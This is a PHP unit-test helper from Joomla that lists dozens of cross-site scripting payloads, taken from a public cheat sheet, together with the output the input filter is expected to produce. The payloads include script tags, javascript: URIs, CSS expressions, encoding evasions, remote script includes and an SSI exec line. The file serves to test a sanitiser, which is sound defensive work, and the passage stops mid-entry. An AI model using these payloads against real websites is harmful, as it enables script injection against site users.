<?php
/**
 * Dataset helper class for XSS attacks
 *
 * @package Joomla
 * @subpackage UnitTest
 * @version $Id: JFilterInput-helper-xssDataset.php 14408 2010-01-26 15:00:08Z louis $
 */

class JFilterInput_XssDataSet {

	/**
	 * Generate an XSS attack case set.
	 *
	 * These test cases based on those at http://ha.ckers.org/xss.html. All
	 * tests were included for completeness; a group filter returns only the
	 * ones we care about.
	 *
	 * @param array Specifies one or more case groups that should be excluded.
	 * @param string Allows selections of multiple result modes (eg. tags /
	 * notags).
	 * @return array Test cases. Each element is (label, input, expected
	 * result).
	 */
	static function buildSet($excludes = array(), $retType = 'result') {
		// A null for result means "copy the input unchanged"
		$cases = array(
			'XSS Locator' => array(
				'type' => 'string',
				// Source XML: &apos;;alert(String.fromCharCode(88,83,83))//\&apos;;alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//\&quot;;alert(String.fromCharCode(88,83,83))//--&gt;&lt;/SCRIPT&gt;&quot;&gt;&apos;&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;=&amp;{}
				'input' => "';alert(String.fromCharCode(88,83,83))//\\';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\\\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>=&{}",
				'result' => null,
				'group' => 'page'
			),
			'XSS Quick Test' => array(
				'type' => 'string',
				// Source XML: &apos;&apos;;!--&quot;&lt;XSS&gt;=&amp;{()}
				'input' => "'';!--\"<XSS>=&{()}",
				'result' => "'';!--\"<XSS />=&{()}",
				'notags' => "'';!--\"=&{()}",
				'group' => ''
			),
			'SCRIPT w/Alert()' => array(
				'type' => 'string',
				// Source XML: &lt;SCRIPT&gt;alert(&apos;XSS&apos;)&lt;/SCRIPT&gt;
				'input' => "<SCRIPT>alert('XSS')</SCRIPT>",
				'result' => "alert('XSS')",
				'group' => ''
			),
			'SCRIPT w/Source File' => array(
				'type' => 'string',
				// Source XML: &lt;SCRIPT SRC=http://ha.ckers.org/xss.js&gt;&lt;/SCRIPT&gt;
				'input' => "<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>",
				'result' => '',
				'group' => ''
			),
			'SCRIPT w/Char Code' => array(
				'type' => 'string',
				// Source XML: &lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;
				'input' => "<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
				'result' => 'alert(String.fromCharCode(88,83,83))',
				'group' => ''
			),
			'BASE' => array(
				'type' => 'string',
				// Source XML: &lt;BASE HREF=&quot;javascript:alert(&apos;XSS&apos;);//&quot;&gt;
				'input' => "<BASE HREF=\"javascript:alert('XSS');//\">",
				'result' => '',
				'group' => ''
			),
			'BGSOUND' => array(
				'type' => 'string',
				// Source XML: &lt;BGSOUND SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;
				'input' => "<BGSOUND SRC=\"javascript:alert('XSS');\">",
				'result' => '',
				'group' => ''
			),
			'BODY background-image' => array(
				'type' => 'string',
				// Source XML: &lt;BODY BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;
				'input' => "<BODY BACKGROUND=\"javascript:alert('XSS');\">",
				'result' => '',
				'group' => ''
			),
			'BODY ONLOAD' => array(
				'type' => 'string',
				// Source XML: &lt;BODY ONLOAD=alert(&apos;XSS&apos;)&gt;
				'input' => "<BODY ONLOAD=alert('XSS')>",
				'result' => '',
				'group' => ''
			),
			'DIV background-image 1' => array(
				'type' => 'string',
				// Source XML: &lt;DIV STYLE=&quot;background-image: url(javascript:alert(&apos;XSS&apos;))&quot;&gt;
				'input' => "<DIV STYLE=\"background-image: url(javascript:alert('XSS'))\">",
				'result' => '<DIV />',
				'group' => ''
			),
			'DIV background-image 1+ (J! w/close tag)' => array(
				'type' => 'string',
				// Source XML: &lt;DIV STYLE=&quot;background-image: url(javascript:alert(&apos;XSS&apos;))&quot;&gt;
				'input' => "<DIV STYLE=\"background-image: url(javascript:alert('XSS'))\">stuff</DIV>",
				'result' => '<DIV>stuff</DIV>',
				'group' => ''
			),
			'DIV background-image 2' => array(
				'type' => 'string',
				// Source XML: &lt;DIV STYLE=&quot;background-image: url(&amp;#1;javascript:alert(&apos;XSS&apos;))&quot;&gt;
				'input' => "<DIV STYLE=\"background-image: url(&#1;javascript:alert('XSS'))\">",
				'result' => '<DIV />',
				'group' => ''
			),
			'DIV expression' => array(
				'type' => 'string',
				// Source XML: &lt;DIV STYLE=&quot;width: expression(alert(&apos;XSS&apos;));&quot;&gt;
				'input' => "<DIV STYLE=\"width: expression(alert('XSS'));\">",
				'result' => '<DIV />',
				'group' => ''
			),
			'FRAME' => array(
				'type' => 'string',
				// Source XML: &lt;FRAMESET&gt;&lt;FRAME SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;/FRAMESET&gt;
				'input' => "<FRAMESET><FRAME SRC=\"javascript:alert('XSS');\"></FRAMESET>",
				'result' => '',
				'group' => ''
			),
			'IFRAME' => array(
				'type' => 'string',
				// Source XML: &lt;IFRAME SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;/IFRAME&gt;
				'input' => "<IFRAME SRC=\"javascript:alert('XSS');\"></IFRAME>",
				'result' => '',
				'group' => ''
			),
			'INPUT Image' => array(
				'type' => 'string',
				// Source XML: &lt;INPUT TYPE=&quot;IMAGE&quot; SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;
				'input' => "<INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert('XSS');\">",
				'result' => '<INPUT TYPE="IMAGE" />',
				'group' => ''
			),
			'IMG w/JavaScript Directive' => array(
				'type' => 'string',
				// Source XML: &lt;IMG SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;
				'input' => "<IMG SRC=\"javascript:alert('XSS');\">",
				'result' => '<IMG />',
				'group' => ''
			),
			'IMG No Quotes/Semicolon' => array(
				'type' => 'string',
				// Source XML: &lt;IMG SRC=javascript:alert(&apos;XSS&apos;)&gt;
				'input' => "<IMG SRC=javascript:alert('XSS')>",
				'result' => '<IMG />',
				'group' => ''
			),
			'IMG Dynsrc' => array(
				'type' => 'string',
				// Source XML: &lt;IMG DYNSRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;
				'input' => "<IMG DYNSRC=\"javascript:alert('XSS');\">",
				'result' => '<IMG />',
				'group' => ''
			),
			'IMG Lowsrc' => array(
				'type' => 'string',
				// Source XML: &lt;IMG LOWSRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;
				'input' => "<IMG LOWSRC=\"javascript:alert('XSS');\">",
				'result' => '<IMG />',
				'group' => ''
			),
			'IMG Embedded commands 1' => array(
				'type' => 'string',
				// Source XML: &lt;IMG SRC=&quot;http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode&quot;&gt;
				'input' => "<IMG SRC=\"http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode\">",
				'result' => '',
				'group' => 'application'
			),
			'IMG Embedded commands 2' => array(
				'type' => 'string',
				// Source XML: Redirect 302 /a.jpg http://victimsite.com/admin.asp&amp;deleteuser
				'input' => "Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser",
				'result' => '',
				'group' => 'server'
			),
			'IMG STYLE w/expression' => array(
				'type' => 'string',
				// Modified: xss -> img
				// Source XML: exp/*&lt;IMG STYLE=&apos;no\xss:noxss(&quot;*//*&quot;);xss:&amp;#101;x&amp;#x2F;*XSS*//*/*/pression(alert(&quot;XSS&quot;))&apos;&gt;
				'input' => "exp/*<IMG STYLE='no\\xss:noxss(\"*//*\");xss:&#101;x&#x2F;*XSS*//*/*/pression(alert(\"XSS\"))'>",
				'result' => '',
				'group' => ''
			),
			'List-style-image' => array(
				'type' => 'string',
				// Source XML: &lt;STYLE&gt;li {list-style-image: url(&quot;javascript:alert(&#39;XSS&#39;)&quot;);}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS
				'input' => "<STYLE>li {list-style-image: url(\"javascript:alert(&#39;XSS&#39;)\");}</STYLE><UL><LI>XSS",
				'result' => "li {list-style-image: url(\"javascript:alert('XSS')\");}<UL /><LI />XSS",
				'group' => ''
			),
			'IMG w/VBscript' => array(
				'type' => 'string',
				// Source XML: &lt;IMG SRC=&apos;vbscript:msgbox(&quot;XSS&quot;)&apos;&gt;
				'input' => "<IMG SRC='vbscript:msgbox(\"XSS\")'>",
				'result' => '<IMG />',
				'group' => ''
			),
			'LAYER' => array(
				'type' => 'string',
				// Source XML: &lt;LAYER SRC=&quot;http://ha.ckers.org/scriptlet.html&quot;&gt;&lt;/LAYER&gt;
				'input' => "<LAYER SRC=\"http://ha.ckers.org/scriptlet.html\"></LAYER>",
				'result' => '',
				'group' => ''
			),
			'Livescript' => array(
				'type' => 'string',
				// Source XML: &lt;IMG SRC=&quot;livescript:[code]&quot;&gt;
				'input' => "<IMG SRC=\"livescript:[code]\">",
				'result' => '<IMG />',
				'group' => ''
			),
			'US-ASCII encoding' => array(
				'type' => 'string',
				// Source XML: %BCscript%BEalert(%A2XSS%A2)%BC/script%BE
				'input' => "%BCscript%BEalert(%A2XSS%A2)%BC/script%BE",
				'result' => '',
				'group' => ''
			),
			'META' => array(
				'type' => 'string',
				// Source XML: &lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=javascript:alert(&apos;XSS&apos;);&quot;&gt;
				'input' => "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('XSS');\">",
				'result' => '',
				'group' => ''
			),
			'META w/data:URL' => array(
				'type' => 'string',
				// Source XML: &lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K&quot;&gt;
				'input' => "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">",
				'result' => '',
				'group' => ''
			),
			'META w/additional URL parameter' => array(
				'type' => 'string',
				// Source XML: &lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0; URL=http://;URL=javascript:alert(&apos;XSS&apos;);&quot;&gt;
				'input' => "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http://;URL=javascript:alert('XSS');\">",
				'result' => '',
				'group' => ''
			),
			'Mocha' => array(
				'type' => 'string',
				// Source XML: &lt;IMG SRC=&quot;mocha:[code]&quot;&gt;
				'input' => "<IMG SRC=\"mocha:[code]\">",
				'result' => '<IMG />',
				'group' => ''
			),
			'OBJECT' => array(
				'type' => 'string',
				// Source XML: &lt;OBJECT TYPE=&quot;text/x-scriptlet&quot; DATA=&quot;http://ha.ckers.org/scriptlet.html&quot;&gt;&lt;/OBJECT&gt;
				'input' => "<OBJECT TYPE=\"text/x-scriptlet\" DATA=\"http://ha.ckers.org/scriptlet.html\"></OBJECT>",
				'result' => '',
				'group' => ''
			),
			'OBJECT w/Embedded XSS' => array(
				'type' => 'string',
				// Source XML: &lt;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389&gt;&lt;param name=url value=javascript:alert(&apos;XSS&apos;)&gt;&lt;/OBJECT&gt;
				'input' => "<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>",
				'result' => '<param name=\"url\" />',
				'group' => ''
			),
			'Embed Flash' => array(
				'type' => 'string',
				// Source XML: &lt;EMBED SRC=&quot;http://ha.ckers.org/xss.swf&quot; AllowScriptAccess=&quot;always&quot;&gt;&lt;/EMBED&gt;
				'input' => "<EMBED SRC=\"http://ha.ckers.org/xss.swf\" AllowScriptAccess=\"always\"></EMBED>",
				'result' => '',
				'group' => ''
			),
			'OBJECT w/Flash 2' => array(
				'type' => 'string',
				// Source XML: a=&quot;get&quot;;&amp;#10;b=&quot;URL(&quot;&quot;;&amp;#10;c=&quot;javascript:&quot;;&amp;#10;d=&quot;alert(&apos;XSS&apos;);&quot;)&quot;;&#10;eval(a+b+c+d);
				'input' => "a=\"get\";&#10;b=\"URL(\"\";&#10;c=\"javascript:\";&#10;d=\"alert('XSS');\")\";\neval(a+b+c+d);",
				'result' => '',
				'group' => ''
			),
			'STYLE' => array(
				'type' => 'string',
				// Source XML: &lt;STYLE TYPE=&quot;text/javascript&quot;&gt;alert(&apos;XSS&apos;);&lt;/STYLE&gt;
				'input' => "<STYLE TYPE=\"text/javascript\">alert('XSS');</STYLE>",
				'result' => "alert('XSS');",
				'group' => ''
			),
			'STYLE w/Comment' => array(
				'type' => 'string',
				// Source XML: &lt;IMG STYLE=&quot;xss:expr/*XSS*/ession(alert(&apos;XSS&apos;))&quot;&gt;
				'input' => "<IMG STYLE=\"xss:expr/*XSS*/ession(alert('XSS'))\">",
				'result' => '<IMG />',
				'group' => ''
			),
			'STYLE w/Anonymous HTML' => array(
				'type' => 'string',
				// Source XML: &lt;XSS STYLE=&quot;xss:expression(alert(&apos;XSS&apos;))&quot;&gt;
				'input' => "<XSS STYLE=\"xss:expression(alert('XSS'))\">",
				'result' => '<XSS />',
				'group' => ''
			),
			'STYLE w/background-image' => array(
				'type' => 'string',
				// Source XML: &lt;STYLE&gt;.XSS{background-image:url(&quot;javascript:alert(&apos;XSS&apos;)&quot;);}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;
				'input' => "<STYLE>.XSS{background-image:url(\"javascript:alert('XSS')\");}</STYLE><A CLASS=XSS></A>",
				'result' => ".XSS{background-image:url(\"javascript:alert('XSS')\");}<A CLASS=\"XSS\"></A>",
				'group' => ''
			),
			'STYLE w/background' => array(
				'type' => 'string',
				// Source XML: &lt;STYLE type=&quot;text/css&quot;&gt;BODY{background:url(&quot;javascript:alert(&apos;XSS&apos;)&quot;)}&lt;/STYLE&gt;
				'input' => "<STYLE type=\"text/css\">BODY{background:url(\"javascript:alert('XSS')\")}</STYLE>",
				'result' => "BODY{background:url(\"javascript:alert('XSS')\")}",
				'group' => ''
			),
			'Stylesheet' => array(
				'type' => 'string',
				// Source XML: &lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;
				'input' => "<LINK REL=\"stylesheet\" HREF=\"javascript:alert('XSS');\">",
				'result' => '',
				'group' => ''
			),
			'Remote Stylesheet 1' => array(
				'type' => 'string',
				// Source XML: &lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;http://ha.ckers.org/xss.css&quot;&gt;
				'input' => "<LINK REL=\"stylesheet\" HREF=\"http://ha.ckers.org/xss.css\">",
				'result' => '',
				'group' => ''
			),
			'Remote Stylesheet 2' => array(
				'type' => 'string',
				// Source XML: &lt;STYLE&gt;@import&apos;http://ha.ckers.org/xss.css&apos;;&lt;/STYLE&gt;
				'input' => "<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>",
				'result' => "@import'http://ha.ckers.org/xss.css';",
				'group' => ''
			),
			'Remote Stylesheet 3' => array(
				'type' => 'string',
				// Source XML: &lt;META HTTP-EQUIV=&quot;Link&quot; Content=&quot;&lt;http://ha.ckers.org/xss.css&gt;; REL=stylesheet&quot;&gt;
				'input' => "<META HTTP-EQUIV=\"Link\" Content=\"<http://ha.ckers.org/xss.css>; REL=stylesheet\">",
				'result' => '',
				'group' => ''
			),
			'Remote Stylesheet 4' => array(
				'type' => 'string',
				// Source XML: &lt;STYLE&gt;BODY{-moz-binding:url(&quot;http://ha.ckers.org/xssmoz.xml#xss&quot;)}&lt;/STYLE&gt;
				'input' => "<STYLE>BODY{-moz-binding:url(\"http://ha.ckers.org/xssmoz.xml#xss\")}</STYLE>",
				'result' => "BODY{-moz-binding:url(\"http://ha.ckers.org/xssmoz.xml#xss\")}",
				'group' => ''
			),
			'TABLE' => array(
				'type' => 'string',
				// Source XML: &lt;TABLE BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;&lt;/TABLE&gt;
				'input' => "<TABLE BACKGROUND=\"javascript:alert('XSS')\"></TABLE>",
				'result' => '<TABLE></TABLE>',
				'group' => ''
			),
			'TD' => array(
				'type' => 'string',
				// Source XML: &lt;TABLE&gt;&lt;TD BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;&lt;/TD&gt;&lt;/TABLE&gt;
				'input' => "<TABLE><TD BACKGROUND=\"javascript:alert('XSS')\"></TD></TABLE>",
				'result' => '<TABLE><TD></TD></TABLE>',
				'group' => ''
			),
			'XML namespace' => array(
				'type' => 'string',
				// Source XML: &lt;HTML xmlns:xss&gt;&lt;?import namespace=&quot;xss&quot; implementation=&quot;http://ha.ckers.org/xss.htc&quot;&gt;&lt;xss:xss&gt;XSS&lt;/xss:xss&gt;&lt;/HTML&gt;
				'input' => "<HTML xmlns:xss><?import namespace=\"xss\" implementation=\"http://ha.ckers.org/xss.htc\"><xss:xss>XSS</xss:xss></HTML>",
				'result' => 'XSS',
				'group' => ''
			),
			'XML data island w/CDATA' => array(
				'type' => 'string',
				// Source XML: &lt;XML ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;![CDATA[&lt;IMG SRC=&quot;javas]]&gt;&lt;![CDATA[cript:alert(&apos;XSS&apos;);&quot;&gt;]]&gt;&lt;/C&gt;&lt;/X&gt;&lt;/xml&gt;&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;
				'input' => "<XML ID=I><X><C><![CDATA[<IMG SRC=\"javas]]><![CDATA[cript:alert('XSS');\">]]></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML>",
				'result' => "<X><C><![CDATA[<IMG SRC=\"javas]]\" /></C></X></xml><SPAN DATASRC=\"#I\" DATAFLD=\"C\" DATAFORMATAS=\"HTML\" />",
				'group' => ''
			),
			'XML data island w/comment' => array(
				'type' => 'string',
				// Source XML: &lt;XML ID=&quot;xss&quot;&gt;&lt;I&gt;&lt;B&gt;&lt;IMG SRC=&quot;javas&lt;!-- --&gt;cript:alert(&apos;XSS&apos;)&quot;&gt;&lt;/B&gt;&lt;/I&gt;&lt;/XML&gt;&lt;SPAN DATASRC=&quot;#xss&quot; DATAFLD=&quot;B&quot; DATAFORMATAS=&quot;HTML&quot;&gt;&lt;/SPAN&gt;
				'input' => "<XML ID=\"xss\"><I><B><IMG SRC=\"javas<!-- -->cript:alert('XSS')\"></B></I></XML><SPAN DATASRC=\"#xss\" DATAFLD=\"B\" DATAFORMATAS=\"HTML\"></SPAN>",
				'result' => "<I><B><IMG /></B></I><SPAN DATASRC=\"#xss\" DATAFLD=\"B\" DATAFORMATAS=\"HTML\"></SPAN>",
				'group' => ''
			),
			'XML (locally hosted)' => array(
				'type' => 'string',
				// Source XML: &lt;XML SRC=&quot;http://ha.ckers.org/xsstest.xml&quot; ID=I&gt;&lt;/XML&gt;&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;
				'input' => "<XML SRC=\"http://ha.ckers.org/xsstest.xml\" ID=I></XML><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>",
				'result' => "<SPAN DATASRC=\"#I\" DATAFLD=\"C\" DATAFORMATAS=\"HTML\"></SPAN>",
				'group' => ''
			),
			'XML HTML+TIME' => array(
				'type' => 'string',
				// Source XML: &lt;HTML&gt;&lt;BODY&gt;&lt;?xml:namespace prefix=&quot;t&quot; ns=&quot;urn:schemas-microsoft-com:time&quot;&gt;&lt;?import namespace=&quot;t&quot; implementation=&quot;#default#time2&quot;&gt;&lt;t:set attributeName=&quot;innerHTML&quot; to=&quot;XSS&lt;SCRIPT DEFER&gt;alert(&apos;XSS&apos;)&lt;/SCRIPT&gt;&quot;&gt; &lt;/BODY&gt;&lt;/HTML&gt;
				'input' => "<HTML><BODY><?xml:namespace prefix=\"t\" ns=\"urn:schemas-microsoft-com:time\"><?import namespace=\"t\" implementation=\"#default#time2\"><t:set attributeName=\"innerHTML\" to=\"XSS<SCRIPT DEFER>alert('XSS')</SCRIPT>\"> </BODY></HTML>",
				'result' => " ",
				'group' => ''
			),
			'Commented-out Block' => array(
				'type' => 'string',
				// Source XML: &lt;!--[if gte IE 4]&gt;\n&lt;SCRIPT&gt;alert(&apos;XSS&apos;);&lt;/SCRIPT&gt;\n&lt;![endif]--&gt;
				'input' => "<!--[if gte IE 4]>\n<SCRIPT>alert('XSS');</SCRIPT>\n<![endif]-->",
				'result' => '',
				'group' => ''
			),
			'Cookie Manipulation' => array(
				'type' => 'string',
				// Source XML: &lt;META HTTP-EQUIV=&quot;Set-Cookie&quot; Content=&quot;USERID=&lt;SCRIPT&gt;alert(&apos;XSS&apos;)&lt;/SCRIPT&gt;&quot;&gt;
				'input' => "<META HTTP-EQUIV=\"Set-Cookie\" Content=\"USERID=<SCRIPT>alert('XSS')</SCRIPT>\">",
				'result' => '',
				'group' => ''
			),
			'Local .htc file' => array(
				'type' => 'string',
				// Source XML: &lt;XSS STYLE=&quot;behavior: url(http://ha.ckers.org/xss.htc);&quot;&gt;
				'input' => "<XSS STYLE=\"behavior: url(http://ha.ckers.org/xss.htc);\">",
				'result' => '<XSS />',
				'group' => ''
			),
			'Rename .js to .jpg' => array(
				'type' => 'string',
				// Source XML: &lt;SCRIPT SRC=&quot;http://ha.ckers.org/xss.jpg&quot;&gt;&lt;/SCRIPT&gt;
				'input' => "<SCRIPT SRC=\"http://ha.ckers.org/xss.jpg\"></SCRIPT>",
				'result' => '',
				'group' => ''
			),
			'SSI' => array(
				'type' => 'string',
				// Source XML: &lt;!--#exec cmd=&quot;/bin/echo &apos;&lt;SCRIPT SRC&apos;&quot;--&gt;&lt;!--#exec cmd=&quot;/bin/echo &apos;=http://ha.ckers.org/xss.js&gt;&lt;/SCRIPT&gt;&apos;&quot;--&gt;
				'input' => "<!--#exec cmd=\"/bin/echo '<SCRIPT SRC'\"--><!--#exec cmd=\"/bin/echo '=http://ha.ckers.org/xss.js></SCRIPT>'\"-->",
				'result' => '',
				'group' => ''
			),
			'PHP' => array(
				'type' => 'string',
				// Source XML: &lt;? echo(&apos;&lt;SCR)&apos;;echo(&apos;IPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&apos;); ?&gt;
				'input' => "<? echo('<SCR)';echo('IPT>alert(\"XSS\")</SCRIPT>'); ?>",
				'result' => '',
				'group' => ''
			),
			'JavaScript Includes' => array(
				'type' => 'string',
				// Source XML: &lt;BR SIZE=&quot;&amp;{alert(&apos;XSS&apos;)}&quot;&gt;
				'input' => "<BR SIZE=\"&{alert('XSS')}\">",
				'result' => "<BR SIZE=\"\">",
				'group' => ''
			),
			'Character Encoding Example' => array(
				'type' => 'string',
				// Source XML: &lt; %3C &amp;lt &amp;lt; &amp;LT &amp;LT; &amp;#60 &amp;#060 &amp;#0060 &amp;#00060 &amp;#000060 &amp;#0000060 &amp;#60; &amp;#060; &amp;#0060; &amp;#00060; &amp;#000060; &amp;#0000060; &amp;#x3c &amp;#x03c &amp;#x003c &amp;#x0003c &amp;#x00003c &amp;#x000003c &amp;#x3c; &amp;#x03c; &amp;#x003c; &amp;#x0003c; &amp;#x00003c; &amp;#x000003c; &amp;#X3c &amp;#X03c &amp;#X003c &amp;#X0003c &amp;#X00003c &amp;#X000003c &amp;#X3c; &amp;#X03c; &amp;#X003c; &amp;#X0003c; &amp;#X00003c; &amp;#X000003c; &amp;#x3C &amp;#x03C &amp;#x003C &amp;#x0003C &amp;#x00003C &amp;#x000003C &amp;#x3C; &amp;#x03C; &amp;#x003C; &amp;#x0003C; &amp;#x00003C; &amp;#x000003C; &amp;#X3C &amp;#X03C &amp;#X003C &amp;#X0003C &amp;#X00003C &amp;#X000003C &amp;#X3C; &amp;#X03C; &amp;#X003C; &amp;#X0003C; &amp;#X00003C; &amp;#X000003C; \x3c \x3C \u003c \u003C
				'input' => "< %3C &lt &lt; &LT &LT; &#60 &#060 &#0060 &#00060 &#000060 &#0000060 &#60; &#060; &#0060; &#00060; &#000060; &#0000060; &#x3c &#x03c &#x003c &#x0003c &#x00003c &#x000003c &#x3c; &#x03c; &#x003c; &#x0003c; &#x00003c; &#x000003c; &#X3c &#X03c &#X003c &#X0003c &#X00003c &#X000003c &#X3c; &#X03c; &#X003c; &#X0003c; &#X00003c; &#X000003c; &#x3C &#x03C &#x003C &#x0003C &#x00003C &#x000003C &#x3C; &#x03C; &#x003C; &#x0003C; &#x00003C; &#x000003C; &#X3C &#X03C &#X003C &#X0003C &#X00003C &#X000003C &#X3C; &#X03C; &#X003C; &#X0003C; &#X00003C; &#X000003C; \\x3c \\x3C \\u003c \\u003C",
				'result' => '',
				'group' => 'encoding'
			),
			'Case Insensitive' => array(
				'type' => 'string',
				// Source XML: &lt;IMG SRC=JaVaScRiPt:alert(&apos;XSS&apos;)&gt;
				'input' => "<IMG SRC=JaVaScRiPt:alert('XSS')>",
				'result' => '<IMG />',
				'group' => ''
			),
			'HTML Entities' => array(
				'type' => 'string',
				// Source XML: &lt;IMG SRC=javascript:alert(&amp;quot;XSS&amp;quot;)&gt;
				'input' => "<IMG SRC=javascript:alert(&quot;XSS&quot;)>",
				'result' => '<IMG />',
				'group' => ''
			),
			'Grave Accents' => array(
				'type' => 'string',
				// Source XML: &lt;IMG SRC=`javascript:alert(&quot;RSnake says, &apos;XSS&apos;&quot;)`&gt;
				'input' => "<IMG SRC=`javascript:alert(\"RSnake says, 'XSS'\")`>",
				'result' => '<IMG />',
				'group' => ''
			),
			'Image w/CharCode' => array(
				'type' => 'string',
				// Source XML: &lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;
				'input' => "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",
				'result' => '<IMG />',
				'group' => ''
			),
			'UTF-8 Unicode Encoding' => array(
				'type' => 'string',
				// Source XML: &lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt;
				'input' => "<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>",
				'result' => '<IMG />',
				'group' => ''
			),
			'Long UTF-8 Unicode w/out Semicolons' => array(
				'type' => 'string',
				// Source XML: &lt;IMG SRC=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&gt;
				'input' => "<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>",
				'result' => '<IMG SRC=\"0000106000009700001180000097000011500000990000114000010500001120000116000005800000970000100000101000011400001160000040000003900000880000083000008300000390000041\" />',
				'group' => ''
			),
			'DIV w/Unicode' => array(
				'type' => 'string',
				// Source XML: &lt;DIV STYLE=&quot;background-image:\0075\0072\006C\0028&apos;\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029&apos;\0029&quot;&gt;
				'input' => "<DIV STYLE=\"background-image:\\0075\\0072\\006C\\0028'\\006a\\0061\\0076\\0061\\0073\\0063\\0072\\0069\\0070\\0074\\003a\\0061\\006c\\0065\\0072\\0074\\0028.1027\\0058.1053\\0053\\0027\\0029'\\0029\">",
				// NOTE: I have no idea where the \n come from in this result, but they seem harmless...
				'result' => "<DIV STYLE=\"background-image:075\n072\n06C\n028'\n06a\n061\n076\n061\n073\n063\n072\n069\n070\n074\n03a\n061\n06c\n065\n072\n074\n028.1027\n058.1053\n053\n027\n029'\n029\" />",
				'group' => ''
			),
			'Hex Encoding w/out Semicolons' => array(
				'type' => 'string',
				// Source XML: &lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;
				'input' => "<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>",
				'result' => "<IMG SRC=\"x6Ax61x76x61x73x63x72x69x70x74x3Ax61x6Cx65x72x74x28x27x58x53x53x27x29\" />",
				'group' => ''
			),
			'UTF-7 Encoding' => array(
				'type' => 'string',
				// Source XML: &lt;HEAD&gt;&lt;META HTTP-EQUIV=&quot;CONTENT-TYPE&quot; CONTENT=&quot;text/html; charset=UTF-7&quot;&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-alert(&apos;XSS&apos;);+ADw-/SCRIPT+AD4-
